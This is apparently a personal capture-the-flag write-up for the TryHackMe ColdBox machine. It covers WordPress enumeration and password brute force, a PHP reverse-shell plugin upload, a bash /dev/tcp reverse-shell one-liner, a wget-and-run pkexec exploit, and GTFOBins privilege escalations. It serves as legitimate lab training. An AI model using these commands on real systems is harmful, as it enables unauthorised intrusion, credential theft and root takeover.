# ColdBox

## General Information

<h3>Difficulty: <img src="https://img.shields.io/badge/Easy%20-green?style=flat-square"> </h3>

<h3> Operating system: Linux </h3> 

<h3> Vulnerability exploited: Wordpress plugins, in privilege escalation the binary pkexec, ftp, chmod, vim and find </h3>

<h3> Date of resolution: 15/07/2025 </h3>

<h3>Link Virtual Machine: <a href="https://tryhackme.com/room/colddboxeasy" target="_blank">Cold Box</a></h3>

### *Read this document en espagnol* <a href="coldbox.md">ColdBox</a>

## Recognition

TryHackme provides us with the target machine's IP address **target_ip**

I'm going to set the IP address of the target machine in the **/etc/hosts** file. I'm going to call it **coldbox**

<p align="center"> 
<img src="images/hosts.png" width="600" alt="Resultado de Nmap">
</p>

### Ping

Depending on the result we can deduce whether it is a Linux or Windows machine, for example:

```
ping -c 1 coldbox
```

**Your ttl=63, therefore, is Linux**

### Open Port Scanning

#### TCP Port Scanning

The command I use with nmap is:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn coldbox
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service | Version                          |
| --------- | ------- | -------------------------------- |
| 80        | http    | Apache httpd 2.4.18              |
| 4512      | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 |

</div>

#### UDP port scanning

```
nmap -sU --top-ports 200 --min-rate=5000 -Pn <Ip de la victima>
```

**No open ports**

## Browsing

I visited the page hosted on this IP

```
http://coldbox/
```

<p align="center"> 
<img src="images/coldbox.png" width="600" alt="Resultado de Nmap">
</p>

Investigating, I find the Wordpress login

```
http://coldbox/wp-login.php
```

<p align="center"> 
<img src="images/login.png" width="600" alt="Resultado de Nmap">
</p>

### Wpscan

First we update the wpscan database

```
wpscan --update
```

Then, I run the following command to find wordpress users

```
wpscan --url http://coldbox --enumerate u,vp
```

<p align="center"> 
<img src="images/wpscan.png" width="600" alt="Resultado de Nmap">
</p>

Next we will brute force the three users with wpscan, but the only one that worked for me was with the user **c0ldd**

```
wpscan --url http://coldbox --passwords /usr/share/wordlists/rockyou.txt --usernames c0ldd
```

<p align="center"> 
<img src="images/resultado.png" width="600" alt="Resultado de Nmap">
</p>

**User:** coldd\
**Password:** 9876543210

Then, we enter the WordPress login and enter the username and password.

<p align="center"> 
<img src="images/wordpress.png" width="600" alt="Resultado de Nmap">
</p>

### Fuzzing web

```
gobuster dir -u http://coldbox -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
```

<p align="center"> 
<img src="images/fzw.png" width="600" alt="Resultado de Nmap">
</p>

```
http://coldbox/wp-includes/
```

<p align="center"> 
<img src="images/wp.png" width="600" alt="Resultado de Nmap">
</p>

```
http://coldbox/hidden/
```

<p align="center"> 
<img src="images/urgent.png" width="600" alt="Resultado de Nmap">
</p>

## Exploitation

```
cp /usr/share/webshells/php/php-reverse-shell.php reverse-shell.php
```

This is where the template we need to edit is located.
**/usr/share/webshells/php/php-reverse-shell.php**

Then, the file we brought to the desktop must be edited so that WordPress can detect it:

<p align="center"> 
<img src="images/php.png" width="600" alt="Resultado de Nmap">
</p>

It is very important to add what we have indicated because otherwise WordPress will not let us upload the plugins.

```
/*
Plugin Name: Reverse Shell
Plugin URI: http://shell.com
Description: gimme a shell
Version: 1.0
Author: me
Author URI: http://www.me.com
Text Domain: shell
Domain Path: /languages
*/
```

<p align="center"> 
<img src="images/php2.png" width="600" alt="Resultado de Nmap">
</p>

This is used to prepare to restore the shell of the target machine in our Kali, in my case, it would be like this:

```
$ip = '10.8.139.36'; 
$port = 4444;       
```

Then, I compress that .php file into zip

```
zip reverse-shell.zip reverse-shell.php 
```

<p align="center"> 
<img src="images/zip.png" width="600" alt="Resultado de Nmap">
</p>

We prepare the listening port

```
nc -lvp 4444
```

We upload the plugins to the page

<p align="center"> 
<img src="images/plugin.png" width="600" alt="Resultado de Nmap">
</p>

We activate it...

<p align="center"> 
<img src="images/nc.png" width="600" alt="Resultado de Nmap">
</p>

but I realize that I am the user www-data not the user c0ldd, so when I go to collect my first **Flag** I won't be able to because I need to be the user c0ldd.

#### How can I get the password for user c0ldd?

When we fuzzed the website, we found the following file, **wp-config.php**. It's usually located at the following path

```
/var/www/html
```

Well, as easy as reading the file that is there.

```
cat wp-config.php
```

<p align="center"> 
<img src="images/config.png" width="600" alt="Resultado de Nmap">
</p>

**usuario:** c0ldd\
**Contraseña:** cybersecurity

```
su c0ldd
```

<p align="center"> 
<img src="images/c0ldd.png" width="600" alt="Resultado de Nmap">
</p>

## PostExplotation

#### TTY

```
script /dev/null -c bash
```
**control z**

```
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

### Privilege Escalation

#### First Form:

```
sudo -l
```

**It didn't work :(**

But if I am logged in with the user **c0ldd** and I execute the previous command, and enter the corresponding password, it will work for me.

<p align="center"> 
<img src="images/sudo.png" width="600" alt="Resultado de Nmap">
</p>

All the commands we need for privilege escalation can be found in
<a href="https://gtfobins.github.io" target="_blank">GTFobins</a> 

##### FTP

<p align="center"> 
<img src="images/ftp.png" width="600" alt="Resultado de Nmap">
</p>

```
sudo ftp
!/bin/sh
```

<p align="center"> 
<img src="images/ftp1.png" width="600" alt="Resultado de Nmap">
</p>

##### CHMOD

What this does is change the permissions of the root folder, without being root....

```
sudo chmod -R 755 /root
```

##### VIM

<p align="center"> 
<img src="images/vim.png" width="600" alt="Resultado de Nmap">
</p>

```
sudo vim -c ':!/bin/sh'
```

Makes you root

#### Second form

```
find / -perm -4000 2>/dev/null
```

<p align="center"> 
<img src="images/find.png" width="600" alt="Resultado de Nmap">
</p>

##### PKEXEC

The **pkexec** binary is active... so we're escalating privileges with that binary.

Go to the **/tmp** folder.

Then we can find the exploit <a href="https://github.com/NxPnch/pkexec-exploit" target="_blank">here</a> 


On my attacker machine we use this command to share the python file to our victim machine

```
python -m http.server 80
```

<p align="center"> 
<img src="images/80.png" width="600" alt="Resultado de Nmap">
</p>

On my victim machine

```
wget http://10.8.139.36/CVE-2021-4034.py
chmod +x CVE-2021-4034.py
./CVE-2021-4034.py
n
whoami
```

<p align="center"> 
<img src="images/whoami.png" width="600" alt="Resultado de Nmap">
</p>

Finally, to get a better connection, I prepare a listening port.

```
nc -lvnp 4443
```

And I run this command on my victim machine

```
bash -c "sh -i >& /dev/tcp/10.8.139.36/4443 0>&1"
```

<p align="center"> 
<img src="images/bash.png" width="600" alt="Resultado de Nmap">
</p>

##### Find

Searching the page <a href="https://gtfobins.github.io/gtfobins/find/" target="_blank">GTFobins</a> 

<p align="center"> 
<img src="images/find3.png" width="600" alt="Resultado de Nmap">
</p>

So if I run this command...

```
/var/www/html$ /usr/bin/find . -exec /bin/sh -p \; -quit
```

<p align="center"> 
<img src="images/whoami5.png" width="600" alt="Resultado de Nmap">
</p>

My first flag

<p align="center"> 
<img src="images/bandera1.png" width="600" alt="Resultado de Nmap">
</p>

My second flag

<p align="center"> 
<img src="images/bandera2.png" width="600" alt="Resultado de Nmap">
</p>

**Finished machine**

## Conclusion

I'm very excited about this machine because, after a lot of practice, it's the first one I've managed to solve without relying on any write-ups. I've been gradually developing this attacker profile, analyzing where I could advance, both in the exploitation phase and in the privilege escalation phase. I'm very happy to see that, after these months of performing CTFs, the results are finally starting to show.

As soon as I saw it was a WordPress attack, the first thing I did was a wpscan, with which I managed to enumerate users and then perform a brute-force attack. Once inside the WordPress administration panel, I exploited a vulnerability by installing a plugin that contained a reverse shell.

Finally, for the privilege escalation, I noticed that the pkexec binary was present and I was able to successfully carry out the escalation.